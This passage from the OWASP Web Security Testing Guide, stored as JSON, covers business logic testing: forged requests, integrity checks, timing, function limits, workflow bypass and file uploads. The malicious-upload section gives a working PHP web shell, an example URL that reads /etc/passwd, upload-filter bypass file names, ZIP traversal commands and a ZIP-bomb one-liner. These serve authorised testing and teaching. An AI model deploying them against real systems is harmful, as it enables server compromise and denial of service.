    },
    "WSTG-BUSL-02": {
        "summary": "<h3>Summary</h3><p>Forging requests is a method that attackers use to circumvent the frontend GUI application to directly submit information for backend processing. The goal of the attacker is to send HTTP POST/GET requests through an intercepting proxy with data values that are not supported, guarded against, or expected by the application’s business logic. Some examples of forged requests include exploiting guessable or predictable parameters or exposing “hidden” features and functionality such as enabling debugging or presenting special screens or windows that are very useful during development but may leak information or bypass the business logic.</p><p>Vulnerabilities related to the ability to forge requests are unique to each application and different from business logic data validation in that its focus is on breaking the business logic workflow.</p><p>Applications should have logic checks in place to prevent the system from accepting forged requests that may allow attackers the opportunity to exploit the business logic, process, or flow of the application. Request forgery is nothing new; the attacker uses an intercepting proxy to send HTTP POST/GET requests to the application. Through request forgeries attackers may be able to circumvent the business logic or process by finding, predicting and manipulating parameters to make the application think a process or task has or has not taken place.</p><p>Also, forged requests may allow subversion of programmatic or business logic flow by invoking “hidden” features or functionality such as debugging initially used by developers and testers sometimes referred to as an “Easter egg” . “An Easter egg is an intentional inside joke, hidden message, or feature in a work such as a computer program, movie, book, or crossword. According to game designer Warren Robinett, the term was coined at Atari by personnel who were alerted to the presence of a secret message which had been hidden by Robinett in his already widely distributed game, Adventure. The name has been said to evoke the idea of a traditional Easter egg hunt.”</p><p>Suppose an e-commerce theater site allows users to select their ticket, apply a onetime 10% Senior discount on the entire sale, view the subtotal and tender the sale. If an attacker is able to see through a proxy that the application has a hidden field (of 1 or 0) used by the business logic to determine if a discount has been taken already or not. The attacker is then able to submit the 1 or “no discount has been taken” value multiple times to take advantage of the same discount multiple times.</p><p>Suppose an online video game pays out tokens for points scored for finding pirate’s treasure, pirates, and for each level completed. These tokens can later be exchanged for prizes. Additionally each level’s points have a multiplier value equal to the level. If an attacker was able to see through a proxy that the application has a hidden field used during development and testing to quickly get to the highest levels of the game they could quickly get to the highest levels and accumulate unearned points quickly.</p><p>Also, if an attacker was able to see through a proxy that the application has a hidden field used during development and testing to enable a log that indicated where other online players, or hidden treasures were in relation to the attacker, they would then be able to quickly go to these locations and score points.</p><h3>Test Objectives</h3><ul><li>Review the project documentation looking for guessable, predictable, or hidden functionality of fields.</li><li>Insert logically valid data in order to bypass normal business logic workflow.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Using an intercepting proxy observe the HTTP POST/GET looking for some indication that values are incrementing at a regular interval or are easily guessable.</li><li>If it is found that some value is guessable this value may be changed and one may gain unexpected visibility.</li></ul><ul><li>Using an intercepting proxy observe the HTTP POST/GET looking for some indication of hidden features such as debug that can be switched on or activated.</li><li>If any are found try to guess and change these values to get a different application response or behavior.</li></ul><h3>Related Test Cases</h3><ul><li>Testing for Exposed Session Variables</li><li>Testing for Cross Site Request Forgery (CSRF)</li><li>Testing for Account Enumeration and Guessable User Account</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li></ul><h3>References</h3><ul><li>Easter egg</li><li>Top 10 Software Easter Eggs</li></ul>",
        "remediation": "<h3>Remediation</h3><p>The application must be smart enough and designed with business logic that will prevent attackers from predicting and manipulating parameters to subvert programmatic or business logic flow, or exploiting hidden/undocumented functionality such as debugging.</p>",
        "test_objectives": ""
    },
    "WSTG-BUSL-03": {
        "summary": "<h3>Summary</h3><p>Many applications are designed to display different fields depending on the user or situation by leaving some inputs hidden. However, in many cases it is possible to submit hidden field values to the server using a proxy. In these cases the server-side controls must be smart enough to perform relational or server-side edits to ensure that the proper data is allowed to the server based on user and application specific business logic.</p><p>Additionally, the application must not depend on non-editable controls, drop-down menus or hidden fields for business logic processing because these fields remain non-editable only in the context of the browsers. Users may be able to edit their values using proxy editor tools and try to manipulate business logic. If the application exposes values related to business rules like quantity, etc. as non-editable fields, it must maintain a copy on the server-side and use the same for business logic processing. Finally, aside from application/system data, log systems must be secured to prevent read, writing, and updating.</p><p>Business logic integrity check vulnerabilities are unique in that these misuse cases are application specific and if users are able to make changes, one should only be able to write or update/edit specific artifacts at specific times as per the business process logic.</p><p>The application must be smart enough to check for relational edits and not allow users to submit information directly to the server that is not valid, trusted because it came from a non-editable controls or the user is not authorized to submit through the frontend. Additionally, system artifacts such as logs must be “protected” from unauthorized read, writing and removal.</p><p>Imagine an ASP.NET GUI application that only allows the admin user to change the password for other users in the system. The admin user will see the username and password fields to enter a username and password while other users will not see either field. However, if a non admin user submits information in the username and password field through a proxy they may be able to “trick” the server into believing that the request has come from an admin user and change password of other users.</p><p>Most web applications have dropdown lists making it easy for the user to quickly select their state, month of birth, etc. Suppose a Project Management application allowed users to login and depending on their privileges presented them with a drop down list of projects they have access to. What happens if an attacker finds the name of another project that they should not have access to and submits the information via a proxy. Will the application give access to the project? They should not have access even though they skipped an authorization business logic check.</p><p>Suppose the motor vehicle administration system required an employee initially verify each citizens’ documentation and information when they issue an identification or driver’s license. At this point the business process has created data with a high level of integrity as the integrity of submitted data is checked by the employees. Now suppose the application is moved to the internet so employees can log on for full service or citizens can log on for a reduced self-service application to update certain information. At this point an attacker may be able to use an intercepting proxy to add or update data that they should not have access to and they could destroy the integrity of the data by stating that the citizen was not married but supplying data for a spouse’s name. This type of inserting or updating of unverified data destroys the data integrity and might have been prevented if the business process logic was followed.</p><p>Many systems include logging for auditing and troubleshooting purposes. But, how good/valid is the information in these logs? Can they be manipulated by attackers either intentionally or accidentally having their integrity destroyed?</p><h3>Test Objectives</h3><ul><li>Review the project documentation for components of the system that move, store, or handle data.</li><li>Determine what type of data is logically acceptable by the component and what types the system should guard against.</li><li>Determine who should be allowed to modify or read that data in each component.</li><li>Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Using a proxy capture HTTP traffic looking for hidden fields.</li><li>If a hidden field is found, see how these fields compare with the GUI application and start interrogating this value through the proxy by submitting different data values trying to circumvent the business process and manipulate values you were not intended to have access to.</li></ul><ul><li>Using a proxy capture HTTP traffic looking for a place to insert information into areas of the application that are non-editable.</li><li>If it is found, see how these fields compare with the GUI application and start interrogating this value through the proxy by submitting different data values trying to circumvent the business process and manipulate values you were not intended to have access to.</li></ul><ul><li>List components of the application or system that could be impacted, for example logs or databases.</li><li>For each component identified, try to read, edit or remove its information. For example log files should be identified and Testers should try to manipulate the data/information being collected.</li></ul><h3>Related Test Cases</h3><p>All Input Validation test cases.</p>",
        "tools": "<h3>Tools</h3><ul><li>Various system/application tools such as editors and file manipulation tools.</li><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li></ul><h3>References</h3><ul><li>Implementing Referential Integrity and Shared Business Logic in a RDB</li><li>On Rules and Integrity Constraints in Database Systems</li><li>Use referential integrity to enforce basic business rules in Oracle</li><li>Maximizing Business Logic Reuse with Reactive Logic</li></ul>",
        "remediation": "<h3>Remediation</h3><p>The application should follow strict access controls on how data and artifacts can be modified and read, and through trusted channels that ensure the integrity of the data. Proper logging should be set in place to review and ensure that no unauthorized access or modification is happening.</p>",
        "test_objectives": ""
    },
    "WSTG-BUSL-04": {
        "summary": "<h3>Summary</h3><p>It is possible that attackers can gather information on an application by monitoring the time it takes to complete a task or give a response. Additionally, attackers may be able to manipulate and break designed business process flows by simply keeping active sessions open and not submitting their transactions in the “expected” time frame.</p><p>Process timing logic vulnerabilities are unique in that these manual misuse cases should be created considering execution and transaction timing that are application/system specific.</p><p>Processing timing may give/leak information on what is being done in the application/system background processes. If an application allows users to guess what the particular next outcome will be by processing time variations, users will be able to adjust accordingly and change behavior based on the expectation and “game the system”.</p><p>Video gambling/slot machines may take longer to process a transaction just prior to a large payout. This would allow astute gamblers to gamble minimum amounts until they see the long process time which would then prompt them to bet the maximum.</p><p>Many system log on processes ask for the username and password. If you look closely you may be able to see that entering an invalid username and invalid user password takes more time to return an error than entering a valid username and invalid user password. This may allow the attacker to know if they have a valid username and not need to rely on the GUI message.</p><p>Figure 4.10.4-1: Example Control Flow of Login Form</p><br><p>Most Arenas or travel agencies have ticketing applications that allow users to purchase tickets and reserve seats. When the user requests the tickets, seats they pick are locked or reserved pending payment. What if an attacker keeps reserving seats but not checking out? Will the seats be released, or will no tickets be sold? Some ticket vendors now only allow users 5 minutes to complete a transaction or the transaction is invalidated.</p><p>Suppose a precious metals e-commerce site allows users to make purchases with a price quote based on market price at the time they log on. What if an attacker logs on and places an order but does not complete the transaction until later in the day only if the price of the metals goes up? Will the attacker get the initial lower price?</p><h3>Test Objectives</h3><ul><li>Review the project documentation for system functionality that may be impacted by time.</li><li>Develop and execute misuse cases.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The tester should identify which processes are dependent on time, whether it was a window for a task to be completed, or if it was execution time between two processes that could allow the bypass of certain controls.</p><p>Following that, it is best to automate the requests that will abuse the above discovered processes, as tools are better fit to analyze the timing and are more precise than manual testing. If this is not possible, manual testing could still be used.</p><p>The tester should draw a diagram of how the process flows, the injection points, and prepare the requests before hand to launch them at the vulnerable processes. Once done, close analysis should be done to identify differences in the process execution, and if the process is misbehaving against the agreed upon business logic.</p><h3>Related Test Cases</h3><ul><li>Testing for Cookies Attributes</li><li>Test Session Timeout</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Develop applications with processing time in mind. If attackers could possibly gain some type of advantage from knowing the different processing times and results add extra steps or processing so that no matter the results they are provided in the same time frame.</p><p>Additionally, the application/system must have mechanism in place to not allow attackers to extend transactions over an “acceptable” amount of time. This may be done by canceling or resetting transactions after a specified amount of time has passed like some ticket vendors are now using.</p>",
        "test_objectives": ""
    },
    "WSTG-BUSL-05": {
        "summary": "<h3>Summary</h3><p>Many of the problems that applications are solving require limits to the number of times a function can be used or action can be executed. Applications must be “smart enough” to not allow the user to exceed their limit on the use of these functions since in many cases each time the function is used the user may gain some type of benefit that must be accounted for to properly compensate the owner. For example: an eCommerce site may only allow a users apply a discount once per transaction, or some applications may be on a subscription plan and only allow users to download three complete documents monthly.</p><p>Vulnerabilities related to testing for the function limits are application specific and misuse cases must be created that strive to exercise parts of the application/functions/actions more than the allowable number of times.</p><p>Attackers may be able to circumvent the business logic and execute a function more times than “allowable” exploiting the application for personal gain.</p><p>Suppose an eCommerce site allows users to take advantage of any one of many discounts on their total purchase and then proceed to checkout and tendering. What happens of the attacker navigates back to the discounts page after taking and applying the one “allowable” discount? Can they take advantage of another discount? Can they take advantage of the same discount multiple times?</p><h3>Test Objectives</h3><ul><li>Identify functions that must set limits to the times they can be called.</li><li>Assess if there is a logical limit set on the functions and if it is properly validated.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Review the project documentation and use exploratory testing looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.</li><li>For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times. For example, can a user navigate back and forth through the pages multiple times executing a function that should only execute once? or can a user load and unload shopping carts allowing for additional discounts.</li></ul><h3>Related Test Cases</h3><ul><li>Testing for Account Enumeration and Guessable User Account</li><li>Testing for Weak lock out mechanism</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>The application should set hard controls to prevent limit abuse. This can be achieved by setting a coupon to be no longer valid on the database level, to set a counter limit per user on the backend or database level, as all users should be identified through a session, whichever is better to the business requirement.</p><h3>References</h3><ul><li>Gold Trading Was Temporarily Halted On The CME This Morning</li></ul>",
        "test_objectives": ""
    },
    "WSTG-BUSL-06": {
        "summary": "<h3>Summary</h3><p>Workflow vulnerabilities involve any type of vulnerability that allows the attacker to misuse an application/system in a way that will allow them to circumvent (not follow) the designed/intended workflow.</p><p>Definition of a workflow on Wikipedia :</p><p>A workflow consists of a sequence of connected steps where each step follows without delay or gap and ends just before the subsequent step may begin. It is a depiction of a sequence of operations, declared as work of a person or group, an organization of staff, or one or more simple or complex mechanisms. Workflow may be seen as any abstraction of real work.</p><p>The application’s business logic must require that the user complete specific steps in the correct/specific order and if the workflow is terminated without correctly completing, all actions and spawned actions are “rolled back” or canceled. Vulnerabilities related to the circumvention of workflows or bypassing the correct business logic workflow are unique in that they are very application/system specific and careful manual misuse cases must be developed using requirements and use cases.</p><p>The applications business process must have checks to ensure that the user’s transactions/actions are proceeding in the correct/acceptable order and if a transaction triggers some sort of action, that action will be “rolled back” and removed if the transaction is not successfully completed.</p><p>Many of us receive some type of “club/loyalty points” for purchases from grocery stores and gas stations. Suppose a user was able to start a transaction linked to their account and then after points have been added to their club/loyalty account cancel out of the transaction or remove items from their “basket” and tender. In this case the system either should not apply points/credits to the account until it is tendered or points/credits should be “rolled back” if the point/credit increment does not match the final tender. With this in mind, an attacker may start transactions and cancel them to build their point levels without actually buying anything.</p><p>An electronic bulletin board system may be designed to ensure that initial posts do not contain profanity based on a list that the post is compared against. If a word on a deny list is found in the user entered text the submission is not posted. But, once a submission is posted the submitter can access, edit, and change the submission contents to include words included in the profanity/deny list since on edit the posting is never compared again. Keeping this in mind, attackers may open an initial blank or minimal discussion then add in whatever they like as an update.</p><h3>Test Objectives</h3><ul><li>Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.</li><li>Develop a misuse case and try to circumvent every logic flow identified.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Start a transaction going through the application past the points that triggers credits/points to the users account.</li><li>Cancel out of the transaction or reduce the final tender so that the point values should be decreased and check the points/credit system to ensure that the proper points/credits were recorded.</li></ul><ul><li>On a content management or bulletin board system enter and save valid initial text or values.</li><li>Then try to append, edit and remove data that would leave the existing data in an invalid state or with invalid values to ensure that the user is not allowed to save the incorrect information. Some “invalid” data or information may be specific words (profanity) or specific topics (such as political issues).</li></ul><h3>Related Test Cases</h3><ul><li>Testing Directory Traversal/File Include</li><li>Testing for Bypassing Authorization Schema</li><li>Testing for Bypassing Session Management Schema</li><li>Test Business Logic Data Validation</li><li>Test Ability to Forge Requests</li><li>Test Integrity Checks</li><li>Test for Process Timing</li><li>Test Number of Times a Function Can be Used Limits</li><li>Test Defenses Against Application Mis-use</li><li>Test Upload of Unexpected File Types</li><li>Test Upload of Malicious Files</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>The application must be self-aware and have checks in place ensuring that the users complete each step in the work flow process in the correct order and prevent attackers from circumventing/skipping/or repeating any steps/processes in the workflow. Test for workflow vulnerabilities involves developing business logic abuse/misuse cases with the goal of successfully completing the business process while not completing the correct steps in the correct order.</p><h3>References</h3><ul><li>OWASP Abuse Case Cheat Sheet</li><li>CWE-840: Business Logic Errors</li></ul>",
        "test_objectives": ""
    },
    "WSTG-BUSL-07": {
        "summary": "<h3>Summary</h3><p>The misuse and invalid use of valid functionality can identify attacks attempting to enumerate the web application, identify weaknesses, and exploit vulnerabilities. Tests should be undertaken to determine whether there are application-layer defensive mechanisms in place to protect the application.</p><p>The lack of active defenses allows an attacker to hunt for vulnerabilities without any recourse. The application’s owner will thus not know their application is under attack.</p><p>An authenticated user undertakes the following (unlikely) sequence of actions:</p><p>The application is monitoring for misuse and responds after the 5th event with extremely high confidence the user is an attacker. For example the application:</p><ul><li>Disables critical functionality</li><li>Enables additional authentication steps to the remaining functionality</li><li>Adds time-delays into every request-response cycle</li><li>Begins to record additional data about the user’s interactions (e.g. sanitized HTTP request headers, bodies and response bodies)</li></ul><p>If the application does not respond in any way and the attacker can continue to abuse functionality and submit clearly malicious content at the application, the application has failed this test case. In practice the discrete example actions in the example above are unlikely to occur like that. It is much more probable that a fuzzing tool is used to identify weaknesses in each parameter in turn. This is what a security tester will have undertaken too.</p><h3>Test Objectives</h3><ul><li>Generate notes from all tests conducted against the system.</li><li>Review which tests had a different functionality based on aggressive input.</li><li>Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>This test is unusual in that the result can be drawn from all the other tests performed against the web application. While performing all the other tests, take note of measures that might indicate the application has in-built self-defense:</p><ul><li>Changed responses</li><li>Blocked requests</li><li>Actions that log a user out or lock their account</li></ul><p>These may only be localized. Common localized (per function) defenses are:</p><ul><li>Rejecting input containing certain characters</li><li>Locking out an account temporarily after a number of authentication failures</li></ul><p>Localized security controls are not sufficient. There are often no defenses against general mis-use such as:</p><ul><li>Forced browsing</li><li>Bypassing presentation layer input validation</li><li>Multiple access control errors</li><li>Additional, duplicated or missing parameter names</li><li>Multiple input validation or business logic verification failures with values that cannot be the result of user mistakes or typos</li><li>Structured data (e.g. JSON, XML) of an invalid format is received</li><li>Blatant cross-site scripting or SQL injection payloads are received</li><li>Utilizing the application faster than would be possible without automation tools</li><li>Change in continental geo-location of a user</li><li>Change of user agent</li><li>Accessing a multi-stage business process in the wrong order</li><li>Large number of, or high rate of use of, application-specific functionality (e.g. voucher code submission, failed credit card payments, file uploads, file downloads, log outs, etc).</li></ul><p>These defenses work best in authenticated parts of the application, although rate of creation of new accounts or accessing content (e.g. to scrape information) can be of use in public areas.</p><p>Not all the above need to be monitored by the application, but there is a problem if none of them are. By testing the web application, doing the above type of actions, was any response taken against the tester? If not, the tester should report that the application appears to have no application-wide active defenses against misuse. Note it is sometimes possible that all responses to attack detection are silent to the user (e.g. logging changes, increased monitoring, alerts to administrators and and request proxying), so confidence in this finding cannot be guaranteed. In practice, very few applications (or related infrastructure such as a web application firewall) are detecting these types of misuse.</p><h3>Related Test Cases</h3><p>All other test cases are relevant.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Applications should implement active defenses to fend off attackers and abusers.</p><h3>References</h3><ul><li>Software Assurance, US Department Homeland Security</li><li>IR 7684Common Misuse Scoring System (CMSS), NIST</li><li>Common Attack Pattern Enumeration and Classification(CAPEC), The Mitre Corporation</li><li>OWASP AppSensor Project</li><li>Watson C, Coates M, Melton J and Groves G,Creating Attack-Aware Software Applications with Real-Time Defenses, CrossTalk The Journal of Defense Software Engineering, Vol. 24, No. 5, Sep/Oct 2011</li></ul>",
        "test_objectives": ""
    },
    "WSTG-BUSL-08": {
        "summary": "<h3>Summary</h3><p>Many applications’ business processes allow for the upload and manipulation of data that is submitted via files. But the business process must check the files and only allow certain “approved” file types. Deciding what files are “approved” is determined by the business logic and is application/system specific. The risk is that by allowing users to upload files, attackers may submit an unexpected file type that could be executed and adversely impact the application or system through attacks that may deface the site, perform remote commands, browse the system files, browse the local resources, attack other servers, or exploit the local vulnerabilities, just to name a few.</p><p>Vulnerabilities related to the upload of unexpected file types is unique in that the upload should quickly reject a file if it does not have a specific extension. Additionally, this is different from uploading malicious files in that in most cases an incorrect file format may not by it self be inherently “malicious” but may be detrimental to the saved data. For example if an application accepts Windows Excel files, if a similar database file is uploaded it may be read but data extracted my be moved to incorrect locations.</p><p>The application may be expecting only certain file types to be uploaded for processing, such as .csv or .txt files. The application may not validate the uploaded file by extension (for low assurance file validation) or content (high assurance file validation). This may result in unexpected system or database results within the application/system or give attackers additional methods to exploit the application/system.</p><p>Suppose a picture sharing application allows users to upload a .gif or .jpg graphic file to the site. What if an attacker is able to upload an HTML file with a <script> tag in it or PHP file? The system may move the file from a temporary location to the final location where the PHP code can now be executed against the application or system.</p><h3>Test Objectives</h3><ul><li>Review the project documentation for file types that are rejected by the system.</li><li>Verify that the unwelcomed file types are rejected and handled safely.</li><li>Verify that file batch uploads are secure and do not allow any bypass against the set security measures.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Study the applications logical requirements.</li><li>Prepare a library of files that are “not approved” for upload that may contain files such as: jsp, exe, or HTML files containing script.</li><li>In the application navigate to the file submission or upload mechanism.</li><li>Submit the “not approved” file for upload and verify that they are properly prevented from uploading</li><li>Check if the site only does file type checks in client-side JavaScript</li><li>Check if the site only checks the file type by “Content-Type” in HTTP request.</li><li>Check if the site only checks the file type by the file extension.</li><li>Check if other uploaded files can be accessed directly by specified URL.</li><li>Check if the uploaded file can include code or script injection.</li><li>Check if there is any file path checking for uploaded files. Especially, hackers may compress files with specified path in ZIP so that the extracted files can be uploaded to intended path after uploading and unzipping.</li></ul><h3>Related Test Cases</h3><ul><li>Test File Extensions Handling for Sensitive Information</li><li>Test Upload of Malicious Files</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Applications should be developed with mechanisms to only accept and manipulate “acceptable” files that the rest of the application functionality is ready to handle and expecting. Some specific examples include: deny lists or allow lists of file extensions, using “Content-Type” from the header, or using a file type recognizer, all to only allow specified file types into the system.</p><h3>References</h3><ul><li>OWASP - Unrestricted File Upload</li><li>File upload security best practices: Block a malicious file upload</li><li>Stop people uploading malicious PHP files via forms</li><li>CWE-434: Unrestricted Upload of File with Dangerous Type</li></ul>",
        "test_objectives": ""
    },
    "WSTG-BUSL-09": {
        "summary": "<h3>Summary</h3><p>Many application’s business processes allow users to upload data to them. Although input validation is widely understood for text-based input fields, it is more complicated to implement when files are accepted. Although many sites implement simple restrictions based on a list of permitted (or blocked) extensions, this is not sufficient to prevent attackers from uploading legitimate file types that have malicious contents.</p><p>Vulnerabilities related to the uploading of malicious files is unique in that these “malicious” files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.</p><p>Finally, “malicious” means different things to different systems, for example malicious files that may exploit SQL server vulnerabilities may not be considered as “malicious” in an environment using a NoSQL data store.</p><p>The application may allow the upload of malicious files that include exploits or shellcode without submitting them to malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture such as: Intrusion Detection/Prevention System, application server anti-virus software or anti-virus scanning by application as files are uploaded (perhaps offloading the scanning using SCAP).</p><p>A common example of this vulnerability is an application such as a blog or forum that allows users to upload images and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP script), this could allow them to execute operating system commands, read and modify information in the filesystem, access the backend database and fully compromise the server.</p><h3>Test Objectives</h3><ul><li>Identify the file upload functionality.</li><li>Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.If documentation is not available then consider what would be appropriate based on the purpose of the application.</li><li>If documentation is not available then consider what would be appropriate based on the purpose of the application.</li><li>Determine how the uploaded files are processed.</li><li>Obtain or create a set of malicious files for testing.</li><li>Try to upload the malicious files to the application and determine whether it is accepted and processed.</li></ul><ul><li>If documentation is not available then consider what would be appropriate based on the purpose of the application.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The simplest checks that an application can do are to determine that only trusted types of files can be uploaded.</p><p>If the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.</p><p>Uploading this kind of shell onto an internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:</p><ul><li>Uploading the shell with a randomly generated name.</li><li>Password protecting the shell.</li><li>Implementing IP based restrictions on the shell.</li></ul><p>Remember to remove the shell when you are done.</p><p>The example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:</p><pre><code><?php if ( $_SERVER [ 'REMOTE_HOST' ] === \"FIXME\" ) { // Set your IP address here if ( isset ( $_REQUEST [ 'cmd' ])){ $cmd = ( $_REQUEST [ 'cmd' ]); echo \"<pre> \\n \" ; system ( $cmd ); echo \"</pre>\" ; } } ?></code></pre><p>Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the cmd GET parameter:</p><p>https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd</p><p>The first step is to determine what the filters are allowing or blocking, and where they are implemented. If the restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting proxy.</p><p>If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:</p><ul><li>Change the value ofContent-Typeasimage/jpegin HTTP request.</li><li>Change the extensions to a less common extension, such asfile.php5,file.shtml,file.asa,file.jsp,file.jspx,file.aspx,file.asp,file.phtml,file.cshtml</li><li>Change the capitalisation of the extension, such asfile.PhPorfile.AspX</li><li>If the request includes multiple filenames, change them to different values.</li><li>Using special trailing characters such as spaces, dots or null characters such asfile.asp...,file.php;jpg,file.asp%00.jpg,1.jpg%00.php</li><li>In badly configured versions of Nginx, uploading a file astest.jpg/x.phpmay allow it to be executed asx.php.</li></ul><p>Once the file type has been validated, it is important to also ensure that the contents of the file are safe. This is significantly harder to do, as the steps required will vary depending on the types of file that are permitted.</p><p>Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the EICAR test file , which is an safe file that is flagged as malicious by all anti-malware software.</p><p>Depending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the Metasploit Framework and the Social Engineer Toolkit (SET) can be used to generate malicious files for various formats.</p><p>When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.</p><p>If the application extracts archives (such as ZIP files), then it may be possible to write to unintended locations using directory traversal. This can be exploited by uploading a malicious ZIP file that contains paths that traverse the file system using sequences such as ..\\..\\..\\..\\shell.php . This technique is discussed further in the snyk advisory .</p><p>A test against Archive Directory Traversal should include two parts:</p><pre><code>Enumeration < ZipEntry > entries = ​ ​ zip ​ . g ​ etEntries (); while ( entries ​ . h ​ asMoreElements ()){ ZipEntry e ​ = ​ entries . nextElement (); File f = new File ( destinationDir , e . getName ()); InputStream input = zip ​ . g ​ etInputStream ( e ); IOUtils ​ . c ​ opy ( input , write ( f )); }</code></pre><p>Follow the steps below to create a ZIP file that can abuse the vulnerable code above once its uploaded to the web server:</p><pre><code># Open a new terminal and create a tree structure # (more directory levels might be required based on the system being targeted) mkdir -p a/b/c # Create a base file echo 'base' > a/b/c/base # Create a traversed file echo 'traversed' > traversed # You can double check the tree structure using `tree` at this stage # Navigate to a/b/c root directory cd a/b/c # Compress the files zip test.zip base ../../../traversed # Verify compressed files content unzip -l test.zip</code></pre><p>A ZIP bomb (more generally known as a decompression bomb) is an archive file that contains a large volume of data. It’s intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to extract the archive. Note that although the ZIP format is the most used example for this, other formats are also affected, including gzip (which is frequently used to compress data in transit).</p><p>At its simplest level, a ZIP bomb can be created by compressing a large file consisting of a single character. The example below shows how to create a 1MB file that will decompress to 1GB:</p><pre><code>dd if = /dev/zero bs = 1M count = 1024 | zip -9 > bomb.zip</code></pre><p>There are a number of methods that can be used to achieve much higher compression ratios, including multiple levels of compression, abusing the ZIP format and quines (which are archives that contain a copy of themselves, causing infinite recursion).</p><p>A successful ZIP bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling cloud platform is used. Do not carry out this kind of attack unless you have considered these risks and have written approval to do so.</p><p>XML files have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks such as the billion laughs attack .</p><p>These are discussed further in the Testing for XML Injection guide.</p><p>Many other file formats also have specific security concerns that need to be taken into account, such as:</p><ul><li>Image files must be checked for maximum pixel/frame size.</li><li>CSV files may allowCSV injection attacks.</li><li>Office files may contain malicious macros or PowerShell code.</li><li>PDFs may contain malicious JavaScript.</li></ul><p>The permitted file formats should be carefully reviewed for potentially dangerous functionality, and where possible attempts should be made to exploit this during testing.</p><p>When there is file upload feature supported, the following API/methods are common to be found in the source code.</p><ul><li>Java:new file,import,upload,getFileName,Download,getOutputString</li><li>C/C++:open,fopen</li><li>PHP:move_uploaded_file(),Readfile,file_put_contents(),file(),parse_ini_file(),copy(),fopen(),include(),require()</li></ul><h3>Related Test Cases</h3><ul><li>Test File Extensions Handling for Sensitive Information</li><li>Testing for XML Injection</li><li>Test Upload of Unexpected File Types</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Metasploit’s payload generation functionality</li><li>Intercepting proxy</li></ul><h3>References</h3><ul><li>OWASP - File Upload Cheat Sheet</li><li>OWASP - Unrestricted File Upload</li><li>Why File Upload Forms are a Major Security Threat</li><li>8 Basic Rules to Implement Secure File Uploads</li><li>Stop people uploading malicious PHP files via forms</li><li>How to Tell if a File is Malicious</li><li>CWE-434: Unrestricted Upload of File with Dangerous Type</li><li>Implementing Secure File Upload</li><li>Metasploit Generating Payloads</li></ul>",
        "remediation": "<h3>Remediation</h3><p>Fully protecting against malicious file upload can be complex, and the exact steps required will vary depending on the types of files that are uploaded, and how the files are processed or parsed on the server. This is discussed more fully in the File Upload Cheat Sheet .</p>",
        "test_objectives": ""
    },
    "WSTG-BUSL-10": {
        "summary": "<h3>Summary</h3><p>Many applications implement payment functionality, including e-commerce sites, subscriptions, charities, donation sites and currency exchanges. The security of this functionality is critical, as vulnerabilities could allow attackers to steal from the organization, make fraudulent purchases, or even to steal payment card details from other users. These issue could result in not only reputational damage to the organization, but also significant financial losses, both from direct losses and fines from industry regulators.</p><h3>Test Objectives</h3><ul><li>Determine whether the business logic for the e-commerce functionality is robust.</li><li>Understand how the payment functionality works.</li><li>Determine whether the payment functionality is secure.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>There are several different ways that applications can integrate payment functionality, and the testing approach will vary depending on which one is used. The most common methods are:</p><ul><li>Redirecting the user to a third-party payment gateway.</li><li>Loading a third-party payment gateway in an IFRAME on the application.</li><li>Having a HTML form that makes a cross-domain POST request to a third-party payment gateway.</li><li>Accepting the card details directly, and then making a POST from the application backend to the payment gateway’s API.</li></ul><p>The Payment Card Industry Data Security Standard (PCI DSS) is a standard that organizations are required to follow in order process debit and card payments (although it’s important to note that it is not a law). A full discussion of this standard is outside of the scope of this guide (and of most penetration tests) - but it’s useful for testers to understand a few key points.</p><p>The most common misconception about PCI DSS is that it only applies to systems that store cardholder data (i.e, debit or credit card details). This is incorrect: it applies to any system that “stores, processes or transmits” this information. Exactly which requirements need to be followed depends on how which of the payment gateway integration methods are used. The Visa Processing E-Commerce Payments guidance provides further details on this, but as a brief summary:</p><p>In addition to the 